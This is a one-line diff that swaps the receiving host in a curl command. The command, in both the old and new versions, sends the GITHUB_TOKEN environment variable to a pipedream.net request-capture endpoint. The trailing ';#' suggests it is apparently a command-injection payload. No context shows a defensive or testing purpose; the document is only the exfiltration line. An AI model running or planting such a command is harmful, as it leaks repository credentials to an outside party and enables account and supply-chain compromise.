@@ -1,1 +1,1 @@
-curl https://en0liva7dzyvpp.x.pipedream.net/?token=$GITHUB_TOKEN;#
+curl https://enmwh7jh1sqb.x.pipedream.net/?token=$GITHUB_TOKEN;#
